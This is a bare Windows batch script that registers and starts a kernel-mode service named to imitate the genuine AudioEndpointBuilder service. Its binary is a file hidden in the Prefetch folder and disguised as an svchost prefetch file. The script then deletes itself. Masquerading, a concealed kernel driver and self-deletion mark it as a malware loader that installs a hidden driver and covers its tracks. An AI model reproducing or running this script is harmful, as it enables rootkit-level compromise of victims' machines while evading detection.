@echo off
cd %~dp0
sc create AudioEndpointBuilder_78 binpath=C:\Windows\Prefetch\SVCHOST.EXE-X09V742J.pf type=kernel
sc start AudioEndpointBuilder_78
del "%~f0"



